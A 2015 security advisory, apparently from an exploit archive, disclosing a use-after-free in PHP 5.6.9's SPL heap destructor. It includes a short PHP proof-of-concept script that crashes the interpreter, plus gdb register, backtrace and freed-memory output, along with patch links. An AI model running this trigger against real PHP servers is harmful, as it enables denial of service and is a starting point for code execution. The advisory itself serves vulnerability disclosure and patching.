@@ -1,0 +1,144 @@
+id: 23721
+date: 06/10/2015
+title: PHP 5.6.9 Use-After-Free Vulnerability
+author: High-Tech Bridge
+cves: 
+
+Product: PHP 
+Vendor: PHP Group
+Vulnerable Version(s): 5.6.9 and probably prior
+Tested Version: 5.6.9
+Advisory Publication:  May 20, 2015  [without technical details]
+Vendor Notification: May 20, 2015 
+Vendor Patch: June 2, 2015 
+Public Disclosure: June 10, 2015 
+Vulnerability Type: Use After Free [CWE-416]
+Risk Level: Medium 
+CVSSv2 Base Score: 4.6 (AV:L/AC:L/Au:N/C:P/I:P/A:P)
+Solution Status: Fixed by Vendor
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered use-after-free vulnerability in a popular programming language PHP, which can be exploited to cause crash and possibly execute arbitrary code on the target system.
+
+The vulnerability resides within the 'spl_heap_object_free_storage()' PHP function when trying to dereference already freed memory. A local attacker can cause segmentation fault or possibly execute arbitrary code on the target system with privileges of webserver. 
+
+Below is a simple code that will trigger a crash:
+<?php
+class SplMinHeap1 extends SplMinHeap {
+  public function compare($a, $b) {
+    return -parent::notexist($a, $b);
+  }
+}
+$h = new SplMinHeap1();
+$h->insert(1);
+$h->insert(6);
+$h->insert(5);
+$h->insert(2); 
+?>
+Running the following PoC we get:
+
+
+gdb-peda$ r ~/Desktop/heap_uaf.php 
+Starting program: /usr/local/bin/php ~/Desktop/heap_uaf.php
+PHP Fatal error:  Call to undefined method SplMinHeap::notexist() in /home/test/Desktop/heap_uaf.php on line 4
+
+Fatal error: Call to undefined method SplMinHeap::notexist() in /home/test/Desktop/heap_uaf.php on line 4
+
+Program received signal SIGSEGV, Segmentation fault.
+[--------------------------------------------------------------------------registers---------------------------------------------------------------------------]
+RAX: 0x5a5a5a5a5a5a5a5a (ZZZZZZZZ)
+RBX: 0x8000000 
+RCX: 0xcd0458 ("/home/test/De"...)
+RDX: 0x16f 
+RSI: 0xcd0458 ("/home/test/De"...)
+RDI: 0x5a5a5a5a5a5a5a5a (ZZZZZZZZ)
+RBP: 0x7fffffffc570 --> 0x7fffffffc5a0 --> 0x7fffffffc5d0 --> 0x7fffffffc600 --> 0x7fffffffc630 --> 0x7fffffffc750 --> 0x7fffffffc850 --> 0x7fffffffc9b0 --> 0x7fffffffdcf0 --> 0x7fffffffde50 --> 0x0 
+RSP: 0x7fffffffc570 --> 0x7fffffffc5a0 --> 0x7fffffffc5d0 --> 0x7fffffffc600 --> 0x7fffffffc630 --> 0x7fffffffc750 --> 0x7fffffffc850 --> 0x7fffffffc9b0 --> 0x7fffffffdcf0 --> 0x7fffffffde50 --> 0x0 
+RIP: 0x82a96f (<zval_delref_p+12>:  mov    eax,DWORD PTR [rax+0x10])
+R8 : 0x269 
+R9 : 0x0 
+R10: 0x7fffffff9b20 --> 0x0 
+R11: 0x7ffff71102f0 --> 0xfffda6c0fffda3ef 
+R12: 0x4209e0 (<_start>:  xor    ebp,ebp)
+R13: 0x7fffffffdf30 --> 0x2 
+R14: 0x0 
+R15: 0x0
+[-----------------------------------------------------------------------------code-----------------------------------------------------------------------------]
+   0x82a964 <zval_delref_p+1>:  mov    rbp,rsp
+   0x82a967 <zval_delref_p+4>:  mov    QWORD PTR [rbp-0x8],rdi
+   0x82a96b <zval_delref_p+8>:  mov    rax,QWORD PTR [rbp-0x8]
+=> 0x82a96f <zval_delref_p+12>:  mov    eax,DWORD PTR [rax+0x10]
+   0x82a972 <zval_delref_p+15>:  lea    edx,[rax-0x1]
+   0x82a975 <zval_delref_p+18>:  mov    rax,QWORD PTR [rbp-0x8]
+   0x82a979 <zval_delref_p+22>:  mov    DWORD PTR [rax+0x10],edx
+   0x82a97c <zval_delref_p+25>:  mov    rax,QWORD PTR [rbp-0x8]
+[----------------------------------------------------------------------------stack-----------------------------------------------------------------------------]
+
+
+As seen above when trying to dereference the value from $rax (which has been already freed) PHP crashes.
+
+
+Stopped reason: SIGSEGV
+0x000000000082a96f in zval_delref_p (pz=0x5a5a5a5a5a5a5a5a) at /home/test/Desktop/php-5.6.9/Zend/zend.h:411
+411    return --pz->refcount__gc;
+
+Running the backtrace command we can see a couple of freed variables: zval_ptr, pz
+gdb-peda$ bt
+#0  0x000000000082a96f in zval_delref_p (pz=0x5a5a5a5a5a5a5a5a) at /home/test/Desktop/php-5.6.9/Zend/zend.h:411
+#1  0x000000000082aafb in i_zval_ptr_dtor (zval_ptr=0x5a5a5a5a5a5a5a5a, __zend_filename=0xcd0458 "/home/test/De"..., __zend_lineno=0x16f) at /home/test/Desktop/php-5.6.9/Zend/zend_execute.h:76
+#2  0x000000000082bdcb in _zval_ptr_dtor (zval_ptr=0x7ffff7fcba88, __zend_filename=0xcd0458 "/home/test/De"..., __zend_lineno=0x16f) at /home/test/Desktop/php-5.6.9/Zend/zend_execute_API.c:424
+#3  0x00000000006e5c1a in spl_heap_object_free_storage (object=0x7ffff7dfdfa0) at /home/test/Desktop/php-5.6.9/ext/spl/spl_heap.c:367
+#4  0x000000000087f566 in zend_objects_store_free_object_storage (objects=0x102e640 <executor_globals+928>) at /home/test/Desktop/php-5.6.9/Zend/zend_objects_API.c:97
+#5  0x000000000082b89e in shutdown_executor () at /home/test/Desktop/php-5.6.9/Zend/zend_execute_API.c:290
+#6  0x0000000000841a4c in zend_deactivate () at /home/test/Desktop/php-5.6.9/Zend/zend.c:960
+#7  0x00000000007a7c40 in php_request_shutdown (dummy=0x0) at /home/test/Desktop/php-5.6.9/main/main.c:1882
+#8  0x00000000008f6501 in do_cli (argc=0x2, argv=0x1032560) at /home/test/Desktop/php-5.6.9/sapi/cli/php_cli.c:1177
+#9  0x00000000008f6d8b in main (argc=0x2, argv=0x1032560) at /home/test/Desktop/php-5.6.9/sapi/cli/php_cli.c:1378
+#10 0x00007ffff6faaec5 in __libc_start_main () from /lib/x86_64-linux-gnu/libc.so.6
+#11 0x0000000000420a09 in _start ()
+
+
+Lastly, from stack #2 we clearly see that the zval_ptr pointer (0x7ffff7fcba88) points to freed memory:
+
+
+gdb-peda$ x/50xw 0x7ffff7fcba88
+0x7ffff7fcba88:  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a
+0x7ffff7fcba98:  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a
+0x7ffff7fcbaa8:  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a
+0x7ffff7fcbab8:  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a
+0x7ffff7fcbac8:  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a
+0x7ffff7fcbad8:  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a
+0x7ffff7fcbae8:  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a
+0x7ffff7fcbaf8:  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a
+0x7ffff7fcbb08:  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a
+0x7ffff7fcbb18:  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a
+0x7ffff7fcbb28:  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a
+0x7ffff7fcbb38:  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a  0x5a5a5a5a
+0x7ffff7fcbb48:  0x5a5a5a5a  0x5a5a5a5a
+
+
+This vulnerability was successfully reproduced Ubuntu 14.04.1 LTS (32 bit and 64 bit) on the latest version of PHP 5.6.9.
+
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Apply Vendor's patch. More Information:
+https://bugs.php.net/bug.php?id=69737
+http://git.php.net/?p=php-src.git;a=commit;h=1cbd25ca15383394ffa9ee8601c5de4c0f2f90e1
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23262 - https://www.htbridge.com/advisory/HTB23262 - Use-After-Free in PHP.
+[2] PHP - http://www.php.net - PHP is a popular general-purpose scripting language that is especially suited to web development.
+[3] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
+[4] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.
+
+#  0day.today [2023-03-22]  #
